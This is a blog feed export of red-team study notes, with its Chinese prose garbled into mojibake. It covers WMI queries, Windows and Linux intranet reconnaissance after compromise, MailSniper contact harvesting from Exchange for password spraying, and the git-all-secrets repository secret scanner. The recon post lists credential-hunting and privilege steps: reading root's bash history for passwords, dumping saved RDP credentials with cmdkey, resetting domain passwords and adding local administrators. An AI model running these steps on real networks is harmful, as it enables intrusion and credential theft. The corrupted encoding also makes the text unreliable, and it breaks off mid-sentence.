è‡ªå·±çš„windowsè®¡ç®—æœºæ”¯æŒå“ªäº›å¯ç”¨çš„WMIç±»</p><p><img src="https://imgtp.apqiang.com/2022/03/29/atPqrfIz.png"></p><p>ä¾‹å­ï¼šåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè·å–è¿›ç¨‹</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span> get-wmiobjectä½äºå‘½ä»¤ç®¡é“ä½ç½® <span class="token number">1</span> çš„ cmdlet Get-WmiObjectè¯·ä¸ºä»¥ä¸‹å‚æ•°æä¾›å€¼:Class: win32_process<span class="token comment">#åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè·å–è¿›ç¨‹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/vknWQNNL.png"></p><p>Get-WmiObjectå’Œwmicç›¸æ¯”ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå‡çº§ç‰ˆï¼ŒGet-WmiObjectå¯ä»¥æŒ‡å®šä¸€ä¸ªå‚æ•°è¿›è¡Œä½¿ç”¨ï¼ˆParametersï¼‰ä¾‹å¦‚åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè·å–è¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šç›¸åº”çš„å‚æ•°è¿›è¡Œä¸€ä¸ªæŸ¥è¯¢ä»–çš„ä¸€ä¸ªè¿‡ç¨‹</p><p><code>Get-WmiObject -Class Win32_Process</code> åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè·å–è¿›ç¨‹</p><p>å…·ä½“çš„å‚æ•°ä»¥åŠå‘½ä»¤åœ¨å®˜æ–¹æ–‡æ¡£ä¸­è¿›è¡ŒæŸ¥è¯¢</p><p><a href="http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters">http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘ä¿¡æ¯æ”¶é›†</title>
      <link href="/2022/03/28/nei-wang-xin-xi-shou-ji/"/>
      <url>/2022/03/28/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»åœ¨å†…ç½‘ä¸­è¯¥å¦‚ä½•æœé›†ä¿¡æ¯ä»¥åŠè¯¥æœé›†å“ªäº›ä¿¡æ¯ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="0x01-Windowsï¼ˆå·¥ä½œç»„å’ŒåŸŸï¼‰"><a href="#0x01-Windowsï¼ˆå·¥ä½œç»„å’ŒåŸŸï¼‰" class="headerlink" title="0x01 Windowsï¼ˆå·¥ä½œç»„å’ŒåŸŸï¼‰"></a>0x01 Windowsï¼ˆå·¥ä½œç»„å’ŒåŸŸï¼‰</h2><h3 id="0x01-1-æ£€æŸ¥å½“å‰shellæƒé™"><a href="#0x01-1-æ£€æŸ¥å½“å‰shellæƒé™" class="headerlink" title="0x01-1 æ£€æŸ¥å½“å‰shellæƒé™"></a>0x01-1 æ£€æŸ¥å½“å‰shellæƒé™</h3><p><code>whoami /user &amp;&amp; whoami /priv</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/4G3iqZCD.png"></p><h3 id="0x01-2-æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"><a href="#0x01-2-æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="0x01-2 æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"></a>0x01-2 æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</h3><p><code>systeminfo</code></p><p>ä¸»æœºå-&gt;æ‰®æ¼”çš„è§’è‰²</p><p><img src="https://imgtp.apqiang.com/2022/03/28/g9zanT0N.png"></p><h3 id="0x01-3-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€ä¿¡æ¯"><a href="#0x01-3-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€ä¿¡æ¯" class="headerlink" title="0x01-3 tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€ä¿¡æ¯"></a>0x01-3 tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€ä¿¡æ¯</h3><p><code>netstat -ano</code></p><p>å¯ä»¥è·å–å†…ç½‘IPåˆ†å¸ƒçŠ¶æ€-æœåŠ¡ï¼ˆredisï¼‰</p><p><img src="https://imgtp.apqiang.com/2022/03/28/cAb597HL.png"></p><h3 id="0x01-4-æœºå™¨å"><a href="#0x01-4-æœºå™¨å" class="headerlink" title="0x01-4 æœºå™¨å"></a>0x01-4 æœºå™¨å</h3><p><code>hostname</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/NvjsJrOS.png"></p><h3 id="0x01-5-æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿ"><a href="#0x01-5-æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿ" class="headerlink" title="0x01-5 æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿ"></a>0x01-5 æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿ</h3><p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p><p><code>ver</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/ARv8kjn7.png"></p><h3 id="0x01-6-æŸ¥æ€è½¯"><a href="#0x01-6-æŸ¥æ€è½¯" class="headerlink" title="0x01-6 æŸ¥æ€è½¯"></a>0x01-6 æŸ¥æ€è½¯</h3><p><code>WMIC /Node:localhost /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:list</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/5tkLRNnG.png"></p><h3 id="0x01-7-æŸ¥çœ‹å½“å‰å®‰è£…çš„ç¨‹åº"><a href="#0x01-7-æŸ¥çœ‹å½“å‰å®‰è£…çš„ç¨‹åº" class="headerlink" title="0x01-7 æŸ¥çœ‹å½“å‰å®‰è£…çš„ç¨‹åº"></a>0x01-7 æŸ¥çœ‹å½“å‰å®‰è£…çš„ç¨‹åº</h3><p><code>wmic product get name,verion</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/QmVn4TwI.png"></p><h3 id="0x01-8-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"><a href="#0x01-8-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·" class="headerlink" title="0x01-8 æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"></a>0x01-8 æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</h3><p><code>quesr</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/JVCXP6MS.png"></p><h3 id="0x01-9-æŸ¥çœ‹ç½‘ç»œé…ç½®"><a href="#0x01-9-æŸ¥çœ‹ç½‘ç»œé…ç½®" class="headerlink" title="0x01-9 æŸ¥çœ‹ç½‘ç»œé…ç½®"></a>0x01-9 æŸ¥çœ‹ç½‘ç»œé…ç½®</h3><p>æœ‰Primary Dns Suffixå°±è¯´æ˜æ˜¯åŸŸå†…ï¼Œç©ºçš„åˆ™å½“å‰æœºå™¨åº”è¯¥åœ¨å·¥ä½œç»„</p><p><code>ipconfig /all</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/7z3QNQAe.png"></p><h3 id="0x01-10-æŸ¥çœ‹è¿›ç¨‹"><a href="#0x01-10-æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="0x01-10 æŸ¥çœ‹è¿›ç¨‹"></a>0x01-10 æŸ¥çœ‹è¿›ç¨‹</h3><p><code>tasklist /v</code></p><p>æœ‰äº›è¿›ç¨‹å¯èƒ½æ˜¯åŸŸç”¨æˆ·å¼€å¯çš„-&gt;é€šè¿‡ç®¡ç†å‘˜æƒé™ å‡­è¯çªƒå–-&gt;çªƒå–åŸŸç”¨æˆ·çš„å‡­è¯</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1e0FrROM.png"></p><h3 id="0x01-11æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ"><a href="#0x01-11æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ" class="headerlink" title="0x01-11æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ"></a>0x01-11æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ</h3><p><code>net config workstation</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/OquVB2qn.png"></p><h3 id="0x01-12-è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•"><a href="#0x01-12-è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•" class="headerlink" title="0x01-12 è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•"></a>0x01-12 è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•</h3><p><code>cmdkey /l</code></p><p>æŠŠå‡­è¯å–ä¸‹æ¥-&gt;æœ¬åœ°è§£å¯†</p><p><img src="https://imgtp.apqiang.com/2022/03/28/3hf2Ldzj.png"></p><h3 id="0x01-13-æŸ¥çœ‹æœ¬æœºä¸Šçš„ç”¨æˆ·è´¦å·åˆ—è¡¨"><a href="#0x01-13-æŸ¥çœ‹æœ¬æœºä¸Šçš„ç”¨æˆ·è´¦å·åˆ—è¡¨" class="headerlink" title="0x01-13 æŸ¥çœ‹æœ¬æœºä¸Šçš„ç”¨æˆ·è´¦å·åˆ—è¡¨"></a>0x01-13 æŸ¥çœ‹æœ¬æœºä¸Šçš„ç”¨æˆ·è´¦å·åˆ—è¡¨</h3><p><code>net user</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/zlCdWYiF.png"></p><h3 id="0x01-14-æŸ¥çœ‹æœ¬æœºç”¨æˆ·XXXçš„ä¿¡æ¯"><a href="#0x01-14-æŸ¥çœ‹æœ¬æœºç”¨æˆ·XXXçš„ä¿¡æ¯" class="headerlink" title="0x01-14 æŸ¥çœ‹æœ¬æœºç”¨æˆ·XXXçš„ä¿¡æ¯"></a>0x01-14 æŸ¥çœ‹æœ¬æœºç”¨æˆ·XXXçš„ä¿¡æ¯</h3><p><code>net user XXX</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/TmUVLOXU.png"></p><p><code>net user /domain</code>                æ˜¾ç¤ºæ‰€åœ¨åŸŸçš„ç”¨æˆ·åå•</p><p><img src="https://imgtp.apqiang.com/2022/03/28/JLDMZ2vh.png"></p><p><code>net user åŸŸç”¨æˆ· /domain</code>     è·å–æŸä¸ªåŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://imgtp.apqiang.com/2022/03/28/GHUVuVBq.png"></p><p><code>net user /domain XXX 123456</code> ä¿®æ”¹åŸŸç”¨æˆ·å¯†ç ï¼Œéœ€è¦åŸŸç®¡ç†å‘˜æƒé™</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Ac8RtURS.png"></p><p><code>net user /do</code>  è·å–åŸŸç”¨æˆ·åˆ—è¡¨</p><p><img src="https://imgtp.apqiang.com/2022/03/28/m44YMg8S.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>  è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</p><p><code>net group &quot;domain controllers&quot; /domain</code> æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¦‚æœæœ‰å¤šå°ï¼‰</p><p><code>net group &quot;domain computers&quot; /domain</code> æŸ¥çœ‹åŸŸæœºå™¨</p><p><code>net group /domain</code> æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„</p><p><img src="https://imgtp.apqiang.com/2022/03/28/jy2JeBDy.png"></p><p><code>net localgroup administrators</code>  æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]</p><p><code>net localgroup administrators /domain</code> ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜</p><p><code>net localgroup administrators workgroup\user001 /add</code> åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</p><p><img src="https://imgtp.apqiang.com/2022/03/28/zG8nxbA6.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/28/DcdhGkQM.png"></p><p><code>net view</code> æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨</p><p><code>net view \\ip</code> æŸ¥çœ‹æŸIPå…±äº«</p><p><code>net view \\GHQ</code> æŸ¥çœ‹GHQè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨</p><p><code>net view /domain</code> æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸ</p><p><code>net view /domain:XYZ</code> æŸ¥çœ‹XYZåŸŸä¸­çš„æœºå™¨åˆ—è¡¨</p><p><code>net accounts /domain</code> æŸ¥è¯¢åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯</p><h2 id="0x02-Windowsï¼ˆåŸŸï¼‰"><a href="#0x02-Windowsï¼ˆåŸŸï¼‰" class="headerlink" title="0x02 Windowsï¼ˆåŸŸï¼‰"></a>0x02 Windowsï¼ˆåŸŸï¼‰</h2><p><code>nltest /domain_trusts /all_trusts /v /server:192.168.1.2</code> è¿”å›æ‰€æœ‰åŸŸä¿¡ä»»åˆ—è¡¨</p><p><code>nltest /dsgetdc:hack /server:192.168.1.2</code> è¿”å›åŸŸæ§å’Œå…¶ç›¸åº”çš„IPåœ°å€</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1Hm3VtpJ.png"></p><h2 id="0x03-Linux"><a href="#0x03-Linux" class="headerlink" title="0x03 Linux"></a>0x03 Linux</h2><h3 id="0x03-1-æŸ¥çœ‹å½“å‰æƒé™"><a href="#0x03-1-æŸ¥çœ‹å½“å‰æƒé™" class="headerlink" title="0x03-1 æŸ¥çœ‹å½“å‰æƒé™"></a>0x03-1 æŸ¥çœ‹å½“å‰æƒé™</h3><p><code>whoami</code></p><h3 id="0x03-2-æŸ¥çœ‹ç½‘å¡é…ç½®"><a href="#0x03-2-æŸ¥çœ‹ç½‘å¡é…ç½®" class="headerlink" title="0x03-2 æŸ¥çœ‹ç½‘å¡é…ç½®"></a>0x03-2 æŸ¥çœ‹ç½‘å¡é…ç½®</h3><p><code>ifconfig</code></p><h3 id="0x03-3-æŸ¥çœ‹ç«¯å£çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œå†…ç½‘IPè¿æ¥ç­‰ï¼‰"><a href="#0x03-3-æŸ¥çœ‹ç«¯å£çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œå†…ç½‘IPè¿æ¥ç­‰ï¼‰" class="headerlink" title="0x03-3 æŸ¥çœ‹ç«¯å£çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œå†…ç½‘IPè¿æ¥ç­‰ï¼‰"></a>0x03-3 æŸ¥çœ‹ç«¯å£çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œå†…ç½‘IPè¿æ¥ç­‰ï¼‰</h3><p><code>netstat -anpt</code></p><h3 id="0x03-4-æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ç­‰ï¼‰"><a href="#0x03-4-æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ç­‰ï¼‰" class="headerlink" title="0x03-4 æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ç­‰ï¼‰"></a>0x03-4 æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ï¼ˆå¼€å¯äº†å“ªäº›æœåŠ¡ç­‰ï¼‰</h3><p><code>ps -ef</code></p><h3 id="0x03-5-æŸ¥çœ‹ç®¡ç†å‘˜çš„å†å²è¾“å…¥å‘½ä»¤ï¼ˆè·å–å¯†ç ï¼Œç½‘ç«™ç›®å½•ï¼Œå†…ç½‘èµ„äº§ç­‰ä¿¡æ¯ï¼‰"><a href="#0x03-5-æŸ¥çœ‹ç®¡ç†å‘˜çš„å†å²è¾“å…¥å‘½ä»¤ï¼ˆè·å–å¯†ç ï¼Œç½‘ç«™ç›®å½•ï¼Œå†…ç½‘èµ„äº§ç­‰ä¿¡æ¯ï¼‰" class="headerlink" title="0x03-5 æŸ¥çœ‹ç®¡ç†å‘˜çš„å†å²è¾“å…¥å‘½ä»¤ï¼ˆè·å–å¯†ç ï¼Œç½‘ç«™ç›®å½•ï¼Œå†…ç½‘èµ„äº§ç­‰ä¿¡æ¯ï¼‰"></a>0x03-5 æŸ¥çœ‹ç®¡ç†å‘˜çš„å†å²è¾“å…¥å‘½ä»¤ï¼ˆè·å–å¯†ç ï¼Œç½‘ç«™ç›®å½•ï¼Œå†…ç½‘èµ„äº§ç­‰ä¿¡æ¯ï¼‰</h3><p><code>history</code></p><p><code>cat /root/.bash_history</code></p><h3 id="0x03-6-æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶ï¼ˆå¯»æ‰¾é…ç½®æ–‡ä»¶ç­‰ï¼‰"><a href="#0x03-6-æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶ï¼ˆå¯»æ‰¾é…ç½®æ–‡ä»¶ç­‰ï¼‰" class="headerlink" title="0x03-6 æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶ï¼ˆå¯»æ‰¾é…ç½®æ–‡ä»¶ç­‰ï¼‰"></a>0x03-6 æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶ï¼ˆå¯»æ‰¾é…ç½®æ–‡ä»¶ç­‰ï¼‰</h3><p><code>find / -name *.cfg</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mailsniper.ps1è·å–Outlookæ‰€æœ‰è”ç³»äºº</title>
      <link href="/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/"/>
      <url>/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»å¦‚ä½•è·å–outlooké‚®ç®±ä¿¡æ¯ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="0x01-æ¡ä»¶"><a href="#0x01-æ¡ä»¶" class="headerlink" title="0x01 æ¡ä»¶"></a>0x01 æ¡ä»¶</h2><p>æŒæ¡å…¶ä¸­ä¸€ä¸ªç”¨æˆ·é‚®ç®±çš„è´¦å·å¯†ç ï¼Œå¹¶ä¸”å¯ä»¥ç™»å½•outlook</p><p>outlookåœ°å€å¯ä»¥æ˜¯å®˜æ–¹çš„ä¹Ÿå¯ä»¥æ˜¯ç›®æ ‡è‡ªå·±æ­å»ºçš„ï¼Œå¹¶æ— å½±å“</p><h2 id="0x02ç›®çš„"><a href="#0x02ç›®çš„" class="headerlink" title="0x02ç›®çš„"></a>0x02ç›®çš„</h2><p>è·å–ç›®æ ‡é‚®ç®±é‡Œçš„æ‰€æœ‰è”ç³»äººï¼Œæ–¹ä¾¿åç»­çˆ†ç ´å¼±å£ä»¤ç­‰ç­‰</p><h2 id="0x03åˆ©ç”¨"><a href="#0x03åˆ©ç”¨" class="headerlink" title="0x03åˆ©ç”¨"></a>0x03åˆ©ç”¨</h2><h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p>å°†å°è¯•Outlook Web Accessï¼ˆOWAï¼‰å’ŒExchange WebæœåŠ¡ï¼ˆEWSï¼‰çš„æ–¹æ³•ã€‚æ¬¡å‘½ä»¤å¯ç”¨äºä»Exchangeæ”¶é›†ç”µå­é‚®ä»¶åˆ—è¡¨ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain \ username -Password Spring2017 -OutFile global-address-list.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper</a></p><p><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></p><h2 id="å·¥å…·åœ°å€"><a href="#å·¥å…·åœ°å€" class="headerlink" title="å·¥å…·åœ°å€"></a>å·¥å…·åœ°å€</h2><p><a href="https://github.com/dafthack/mailsniper">https://github.com/dafthack/mailsniper</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-all-secret</title>
      <link href="/2022/03/26/git-all-secret/"/>
      <url>/2022/03/26/git-all-secret/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»å·¥å…·git-all-secretï¼Œç”¨äºæœç´¢githubä»“åº“ã€‚ä½†ç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™dockerç¯å¢ƒä¸­çš„å·¥å…·æ— æ³•è§£ædnsï¼Œè€Œä¸”ä¸èƒ½æŒ‚èµ·dockerè¿›å…¥åˆ°bashï¼Œä½¿ç”¨èµ·æ¥è¾ƒä¸ºå›°éš¾ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="Git-all-secretåŠŸèƒ½æè¿°"><a href="#Git-all-secretåŠŸèƒ½æè¿°" class="headerlink" title="Git-all-secretåŠŸèƒ½æè¿°"></a>Git-all-secretåŠŸèƒ½æè¿°</h2><ul><li>å…‹éš†å¤šä¸ªæŸç»„ç»‡çš„ public/private æœ‰ä»“åº“å¹¶æ‰«æï¼›</li><li>å…‹éš†å¤šä¸ªæŸç»„ç»‡ç”¨æˆ·çš„ public/private ä»“åº“æ‰«æï¼›</li><li>å…‹éš†ä¸€ä¸ªæŸç»„ç»‡çš„ public/private ä»“åº“å¹¶æ‰«æï¼›</li><li>å…‹éš†ä¸€ä¸ªæŸç”¨æˆ·çš„ public/private ä»“åº“å¹¶æ‰«æï¼›</li><li>å…‹éš†ä¸€ä¸ªæŸç”¨æˆ·çš„ public/secret gist ï¼ˆä»£ç ç‰‡æ®µç®¡ç†æœåŠ¡ï¼‰å¹¶æ‰«æï¼›</li><li>å…‹éš†ä¸€ä¸ªæŸç»„ç»‡å›¢é˜Ÿçš„ä»“åº“å¹¶æ‰«æï¼›</li><li>å…‹éš†å’Œæ‰«æGithubä¼ä¸šä»“åº“è¿˜æœ‰gistsï¼›</li></ul><h2 id="æ‰«æè¿‡ç¨‹éœ€è¦å€ŸåŠ©çš„å¼€æºå·¥å…·"><a href="#æ‰«æè¿‡ç¨‹éœ€è¦å€ŸåŠ©çš„å¼€æºå·¥å…·" class="headerlink" title="æ‰«æè¿‡ç¨‹éœ€è¦å€ŸåŠ©çš„å¼€æºå·¥å…·"></a>æ‰«æè¿‡ç¨‹éœ€è¦å€ŸåŠ©çš„å¼€æºå·¥å…·</h2><ul><li>truffleHog - æ‰«æé«˜ç†µå€¼å­—ç¬¦ä¸²å’Œç”¨æˆ·æä¾›çš„æ­£åˆ™è¡¨è¾¾å¼ï¼›</li><li>repo-supervisoræ‰«æåœ¨jså’Œjsonæ–‡ä»¶ä¸­çš„é«˜ç†µå€¼å­—ç¬¦ä¸²ï¼›</li></ul><p>æ‰€æœ‰å·¥å…·ä¸­çš„è¾“å‡ºæ–‡ä»¶æœ€ç»ˆä¼šåˆå¹¶ä¸ºä¸€ä¸ªè¾“å‡ºæ–‡ä»¶</p><h2 id="æ–°æ‰‹å…¥é—¨ä½¿ç”¨"><a href="#æ–°æ‰‹å…¥é—¨ä½¿ç”¨" class="headerlink" title="æ–°æ‰‹å…¥é—¨ä½¿ç”¨"></a>æ–°æ‰‹å…¥é—¨ä½¿ç”¨</h2><h4 id="ä¸‹è½½docker"><a href="#ä¸‹è½½docker" class="headerlink" title="ä¸‹è½½docker"></a>ä¸‹è½½docker</h4><p>è¿è¡ŒGit-all-secretsæœ€ç®€ä¾¿çš„æ–¹æ³•æ˜¯ä½¿ç”¨Docker</p><p>è·å–Dockerï¼šapt install docker docker-compose</p><h4 id="ä¸‹è½½Git-all-secrets"><a href="#ä¸‹è½½Git-all-secrets" class="headerlink" title="ä¸‹è½½Git-all-secrets"></a>ä¸‹è½½Git-all-secrets</h4><p>git clone <a href="https://github.com/anshumanbh/git-all-secrets.git">https://github.com/anshumanbh/git-all-secrets.git</a></p><h4 id="è¿è¡Œgit-all-secrets"><a href="#è¿è¡Œgit-all-secrets" class="headerlink" title="è¿è¡Œgit-all-secrets"></a>è¿è¡Œgit-all-secrets</h4><ul><li><p>è¿è¡Œ docker run â€“rm -it abhartiya/tools_gitallsecrets â€“help æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</p></li><li><p>è¿è¡Œ docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; æ‰«æç»„ç»‡</p></li><li><p>è¿è¡Œ docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=&lt;&gt; é€‰æ‹©å¾…å®šå·¥å…·ï¼ŒtoolName=thog or repo-supervisor</p></li><li><p>è¿è¡Œ docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=thog -thogEntropy truffleHog çš„é»˜è®¤æ­£åˆ™å’Œé«˜ç†µè®¾ç½®</p></li><li><p>å½“å®¹å™¨å®Œæˆè¿è¡Œï¼Œè¾“å…¥ docker ps -a è¿”å›å®¹å™¨ID</p></li><li><p>è·å¾—å®¹å™¨IDä»¥åï¼Œè¾“å…¥ docker cp :/root/results.txt æ¥è·å–ç»“æœæ–‡ä»¶</p></li></ul><h4 id="æ ‡å¿—-é€‰é¡¹"><a href="#æ ‡å¿—-é€‰é¡¹" class="headerlink" title="æ ‡å¿—/é€‰é¡¹"></a>æ ‡å¿—/é€‰é¡¹</h4><ul><li>-token= Githubè®¿é—®ä»¤ç‰Œã€‚å¦‚æœæœªæˆæƒè¯·æ±‚Github APIä¼šè¢«é™é€Ÿ</li><li>-org= ç»„ç»‡æ‰«æã€‚ä»–ä¼šæ‰«æç»„ç»‡ä¸­çš„æ‰€æœ‰å…¬å…±ä»“åº“ï¼Œä»¥åŠç”¨æˆ·çš„gistsã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯è¯¥ç»„ç»‡ç”¨æˆ·çš„tokenï¼Œä»–è¿˜ä¼šå…‹éš†å¹¶æ‰«æè¯¥ç”¨æˆ·çš„æ‰€æœ‰ç§å¯†gitstsï¼Œä»¥åŠæ‰€æœ‰è¯¥ç”¨æˆ·æœ‰æƒé™è®¿é—®çš„ç§æœ‰ä»“åº“</li><li>-user= ç”¨æˆ·æ‰«æã€‚ä»–ä¼šæ‰«æå½“å‰ç”¨æˆ·çš„æ‰€æœ‰ä»“åº“å’Œgistsï¼Œæ‰«æç§æœ‰ä»“åº“è¯·ä½¿ç”¨scanPrivateReposOnlyæ ‡å¿—ï¼Œä»¥åŠSSHkey</li><li>-repoURL= httpsURL ä»“åº“æ‰«æã€‚ä»–åªä¼šæ‰«æå½“å‰ä»“åº“ã€‚å¦‚æœä½ å¸Œæœ›æ‰«æç§æœ‰ä»“åº“ï¼Œè¯·æä¾›SSH URLå’ŒSSHkeyï¼Œä»¥åŠscanPrivateReposOnlyæ ‡å¿—</li><li>-gistURL= httpsURL Gistæ‰«æã€‚ä»–åªä¼šæ‰«æGistã€‚å¦‚æœä½ 